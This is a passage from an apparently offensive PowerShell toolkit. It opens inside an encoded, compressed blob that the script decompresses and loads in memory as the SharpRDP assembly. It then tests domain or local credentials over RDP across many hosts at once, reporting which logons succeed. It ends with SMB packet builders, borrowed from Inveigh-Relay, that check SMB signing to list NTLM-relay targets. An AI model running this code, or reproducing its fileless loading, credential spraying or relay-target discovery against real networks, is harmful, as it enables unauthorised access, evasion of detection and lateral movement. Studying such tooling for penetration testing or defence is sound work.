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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SharpRDP.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "RDP " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

if ($LocalAuth){$Domain = $ComputerName}
if ($Password -ne ""){$result = Invoke-SharpRDP -Command "username=$Domain\$Username password=$Password computername=$ComputerName command='hostname'"}
           
            $result = $result.Trim()

            $SuccessStatus = @('Success', 'STATUS_PASSWORD_MUST_CHANGE', 'LOGON_FAILED_UPDATE_PASSWORD', 'ARBITRATION_CODE_BUMP_OPTIONS', 'ARBITRATION_CODE_CONTINUE_LOGON', 'ARBITRATION_CODE_CONTINUE_TERMINATE', 'ARBITRATION_CODE_NOPERM_DIALOG', 'ARBITRATION_CODE_REFUSED_DIALOG', 'ARBITRATION_CODE_RECONN_OPTIONS')
            $DeniedStatus = @('ERROR_CODE_ACCESS_DENIED', 'LOGON_FAILED_BAD_PASSWORD', 'LOGON_FAILED_OTHER', 'LOGON_WARNING', 'STATUS_LOGON_FAILURE', 'SSL_ERR_LOGON_FAILURE', 'disconnectReasonByServer', 'disconnectReasonRemoteByUser')
            $PwChangeStatus = @('SSL_ERR_PASSWORD_MUST_CHANGE')
            $ToDStatus = @('STATUS_ACCOUNT_RESTRICTION')

switch ($result) {
    "Unable to connect" {continue}

    { $SuccessStatus -contains $_ } {
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    { $DeniedStatus -contains $_ } {
        if ($SuccessOnly){Continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
        continue
    }
    
    { $PwChangeStatus -contains $_ } {
        if ($SuccessOnly){continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Magenta" -statusSymbol "[/] " -statusText "PASSWORD CHANGE REQUIRED" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    { $ToDStatus -contains $_ } {
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS - ACCOUNT RESTRICTION" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    default {
        if ($SuccessOnly){continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Yellow" -statusSymbol "[*] " -statusText "$_" -NameLength $NameLength -OSLength $OSLength
        continue
    }
}
   


        }

            while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
            Start-Sleep -Milliseconds 100
}

$RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly
        [array]$RDPJobs += $RDPJob

        # Check if the maximum number of concurrent jobs has been reached
        if ($RDPJobs.Count -ge $MaxConcurrentJobs) {
            do {
                # Wait for any job to complete
                $JobFinished = $null
                foreach ($Job in $RDPJobs) {
                    if ($Job.State -eq 'Completed') {
                        $JobFinished = $Job
                        break
                    }
                }

                if ($JobFinished) {
                    # Retrieve the job result and remove it from the job list
                    $Result = Receive-Job -Job $JobFinished
                    # Process the result as needed
                    $Result

                    $RDPJobs = $RDPJobs | Where-Object { $_ -ne $JobFinished }
                    Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
                }
            }
            until (-not $JobFinished)
        }
    }

    # Wait for any remaining jobs to complete
    $RDPJobs | ForEach-Object {
        $JobFinished = $_ | Wait-Job -Timeout "15"

        if ($JobFinished) {
            # Retrieve the job result and remove it from the job list
            $Result = Receive-Job -Job $JobFinished
            # Process the result as needed
            $Result

            Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
        }
    }

    # Clean up all remaining jobs
    $RDPJobs | Remove-Job -Force -ErrorAction "SilentlyContinue"
}

################################################################################################################
############################################# Function: GenRelayList ###########################################
################################################################################################################
Function Get-SMBSigning  {

Param (
    [String]$Target,
    [String[]]$Targets=@(),
    [Float]$Delay,
    [Float]$DelayJitter
    ) 

    #borrowed from https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh-Relay.ps1
    function ConvertFrom-PacketOrderedDictionary
    {
        param($packet_ordered_dictionary)

        ForEach($field in $packet_ordered_dictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

    #NetBIOS

    function Get-PacketNetBIOSSessionService()
    {
        param([Int]$packet_header_length,[Int]$packet_data_length)

        [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
        $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

        $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type",[Byte[]](0x00))
        $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length",[Byte[]]($packet_netbios_session_service_length))

        return $packet_NetBIOSSessionService
    }

    #SMB1

    function Get-PacketSMBHeader()
    {
        param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

        $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBHeader.Add("SMBHeader_Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
        $packet_SMBHeader.Add("SMBHeader_Command",$packet_command)
        $packet_SMBHeader.Add("SMBHeader_ErrorClass",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved",[Byte[]](0x00))
        $packet_SMBHeader.Add("SMBHeader_ErrorCode",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Flags",$packet_flags)
        $packet_SMBHeader.Add("SMBHeader_Flags2",$packet_flags2)
        $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("SMBHeader_TreeID",$packet_tree_ID)
        $packet_SMBHeader.Add("SMBHeader_ProcessID",$packet_process_ID)
        $packet_SMBHeader.Add("SMBHeader_UserID",$packet_user_ID)
        $packet_SMBHeader.Add("SMBHeader_MultiplexID",[Byte[]](0x00,0x00))

        return $packet_SMBHeader
    }

    function Get-PacketSMBNegotiateProtocolRequest()
    {
        param([String]$packet_version)

        if($packet_version -eq 'SMB1')
        {
            [Byte[]]$packet_byte_count = 0x0c,0x00
        }
        else
        {
            [Byte[]]$packet_byte_count = 0x22,0x00  
        }

        $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount",[Byte[]](0x00))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount",$packet_byte_count)
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

        if($packet_version -ne 'SMB1')
        {
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
            $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }

        return $packet_SMBNegotiateProtocolRequest
    }

    function Get-PacketSMBSessionSetupAndXRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_byte_count = $packet_byte_count[0,1]
        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_WordCount",[Byte[]](0x0c))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxBuffer",[Byte[]](0xff,0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxMpxCount",[Byte[]](0x02,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_VCNumber",[Byte[]](0x01,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlobLength",$packet_byte_count)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_ByteCount",$packet_security_blob_length)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlob",$packet_security_blob)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeOS",[Byte[]](0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeLANManage",[Byte[]](0x00,0x00))

        return $packet_SMBSessionSetupAndXRequest 
    }

    function Get-PacketSMBTreeConnectAndXRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_WordCount",[Byte[]](0x04))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_PasswordLength",[Byte[]](0x01,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_ByteCount",$packet_path_length)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Password",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Tree",$packet_path)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

        return $packet_SMBTreeConnectAndXRequest
    }

    function Get-PacketSMBNTCreateAndXRequest()
    {
        param([Byte[]]$packet_named_pipe)

        [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]
        [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
        $packet_file_name_length = $packet_file_name_length[0,1]

        $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_WordCount",[Byte[]](0x18))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved2",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileNameLen",$packet_file_name_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_RootFID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Disposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_SecurityFlags",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ByteCount",$packet_named_pipe_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Filename",$packet_named_pipe)

        return $packet_SMBNTCreateAndXRequest
    }

    function Get-PacketSMBReadAndXRequest()
    {
        $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_WordCount",[Byte[]](0x0a))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_FID",[Byte[]](0x00,0x40))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MaxCountLow",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MinCount",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Unknown",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Remaining",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBReadAndXRequest
    }

    function Get-PacketSMBWriteAndXRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)
        $packet_write_length = $packet_write_length[0,1]

        $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WordCount",[Byte[]](0x0e))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_FID",$packet_file_ID)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Offset",[Byte[]](0xea,0x03,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WriteMode",[Byte[]](0x08,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Remaining",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthHigh",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthLow",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataOffset",[Byte[]](0x3f,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_ByteCount",$packet_write_length)

        return $packet_SMBWriteAndXRequest
    }

    function Get-PacketSMBCloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBCloseRequest.Add("SMBCloseRequest_WordCount",[Byte[]](0x03))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_FID",$packet_file_ID)
        $packet_SMBCloseRequest.Add("SMBCloseRequest_LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBCloseRequest
    }

    function Get-PacketSMBTreeDisconnectRequest()
    {
        $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_WordCount",[Byte[]](0x00))
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBTreeDisconnectRequest
    }

    function Get-PacketSMBLogoffAndXRequest()
    {
        $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_WordCount",[Byte[]](0x02))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBLogoffAndXRequest
    }

    #SMB2

    function Get-PacketSMB2Header()
    {
        param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

        [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

        $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2Header.Add("SMB2Header_ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
        $packet_SMB2Header.Add("SMB2Header_StructureSize",[Byte[]](0x40,0x00))
        $packet_SMB2Header.Add("SMB2Header_CreditCharge",[Byte[]](0x01,0x00))
        $packet_SMB2Header.Add("SMB2Header_ChannelSequence",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Command",$packet_command)
        $packet_SMB2Header.Add("SMB2Header_CreditRequest",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Flags",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_MessageID",$packet_message_ID)
        $packet_SMB2Header.Add("SMB2Header_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
